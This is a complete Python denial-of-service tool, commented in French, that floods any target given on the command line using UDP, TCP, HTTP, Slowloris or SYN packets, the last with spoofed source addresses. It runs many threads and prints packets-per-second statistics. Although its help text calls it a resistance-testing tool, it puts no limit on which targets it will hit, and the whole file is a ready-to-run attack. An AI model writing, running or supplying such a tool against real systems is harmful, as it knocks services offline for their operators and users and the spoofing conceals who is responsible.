#!/usr/bin/env python3
import socket
import threading
import time
import random
import sys
import argparse
from concurrent.futures import ThreadPoolExecutor
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class DDoSAttack:
    def __init__(self, target, port, threads):
        self.target = target
        self.port = port
        self.threads = threads
        self.running = False
        self.packets_sent = 0
        self.start_time = None
        
    def udp_flood(self):
        """Attaque par inondation UDP"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_to_send = random._urandom(1490)
        payload = b"\x00" * 1024
        
        while self.running:
            try:
                sock.sendto(payload, (self.target, self.port))
                self.packets_sent += 1
            except Exception:
                pass
        sock.close()
    
    def tcp_flood(self):
        """Attaque par inondation TCP"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.target, self.port))
                sock.sendto(b"GET / HTTP/1.1\r\n", (self.target, self.port))
                sock.sendto(b"Host: " + self.target.encode() + b"\r\n\r\n", (self.target, self.port))
                self.packets_sent += 1
                sock.close()
            except Exception:
                pass
    
    def http_flood(self):
        """Attaque par inondation de requêtes HTTP"""
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
        }
        
        url = f"http://{self.target}:{self.port}/"
        
        while self.running:
            try:
                requests.get(url, headers=headers, timeout=1, verify=False)
                self.packets_sent += 1
            except Exception:
                pass
    
    def slowloris_attack(self):
        """Attaque Slowloris - maintient de nombreuses connexions HTTP ouvertes"""
        headers = [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept-language: en-US,en",
            "Accept-Encoding: gzip, deflate",
            "Connection: keep-alive",
            "X-Requested: XMLHttpRequest"
        ]
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.target, self.port))
                
                # Envoie d'un en-tête HTTP partiel
                sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {self.target}\r\n".encode())
                
                for header in headers:
                    sock.send(f"{header}\r\n".encode())
                    time.sleep(0.1)
                
                # Maintien de la connexion avec des en-têtes périodiques
                while self.running:
                    sock.send(f"X-a: {random.randint(0, 5000)}\r\n".encode())
                    time.sleep(random.randint(10, 30))
                    
                sock.close()
                self.packets_sent += 1
            except Exception:
                pass
    
    def syn_flood(self):
        """Attaque SYN Flood (requiert des privilèges root)"""
        try:
            from scapy.all import IP, TCP, send
        except ImportError:
            print("L'attaque SYN Flood nécessite l'installation de scapy: pip install scapy")
            return
        
        while self.running:
            try:
                # Création d'un paquet IP avec un faux IP source
                source_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                packet = IP(src=source_ip, dst=self.target) / TCP(dport=self.port, flags="S")
                send(packet, verbose=0)
                self.packets_sent += 1
            except Exception:
                pass
    
    def start_attack(self, attack_type):
        """Démarre l'attaque spécifiée"""
        self.running = True
        self.start_time = time.time()
        
        print(f"Lancement de l'attaque {attack_type} sur {self.target}:{self.port} avec {self.threads} threads")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            if attack_type == "udp":
                for _ in range(self.threads):
                    executor.submit(self.udp_flood)
            elif attack_type == "tcp":
                for _ in range(self.threads):
                    executor.submit(self.tcp_flood)
            elif attack_type == "http":
                for _ in range(self.threads):
                    executor.submit(self.http_flood)
            elif attack_type == "slowloris":
                for _ in range(self.threads):
                    executor.submit(self.slowloris_attack)
            elif attack_type == "syn":
                for _ in range(self.threads):
                    executor.submit(self.syn_flood)
        
        # Affichage des statistiques
        try:
            while self.running:
                elapsed = time.time() - self.start_time
                pps = self.packets_sent / elapsed if elapsed > 0 else 0
                print(f"\rPaquets envoyés: {self.packets_sent} | PPS: {pps:.2f} | Temps écoulé: {elapsed:.2f}s", end="")
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop_attack()
    
    def stop_attack(self):
        """Arrête l'attaque"""
        self.running = False
        elapsed = time.time() - self.start_time
        pps = self.packets_sent / elapsed if elapsed > 0 else 0
        print(f"\n\nAttaque terminée. {self.packets_sent} paquets envoyés en {elapsed:.2f} secondes ({pps:.2f} PPS)")

def main():
    parser = argparse.ArgumentParser(description='Outil de test de résistance DDoS')
    parser.add_argument('target', help='Adresse IP ou domaine de la cible')
    parser.add_argument('-p', '--port', type=int, default=80, help='Port de la cible (défaut: 80)')
    parser.add_argument('-t', '--threads', type=int, default=100, help='Nombre de threads (défaut: 100)')
    parser.add_argument('-a', '--attack', choices=['udp', 'tcp', 'http', 'slowloris', 'syn'], 
                        default='http', help='Type d\'attaque (défaut: http)')
    
    args = parser.parse_args()
    
    # Résolution du nom de domaine si nécessaire
    try:
        target_ip = socket.gethostbyname(args.target)
        if args.target != target_ip:
            print(f"Résolution DNS: {args.target} -> {target_ip}")
            target = target_ip
        else:
            target = args.target
    except socket.gaierror:
        print(f"Impossible de résoudre le nom d'hôte: {args.target}")
        sys.exit(1)
    
    # Création et lancement de l'attaque
    attack = DDoSAttack(target, args.port, args.threads)
    
    try:
        attack.start_attack(args.attack)
    except KeyboardInterrupt:
        attack.stop_attack()

if __name__ == "__main__":
    main()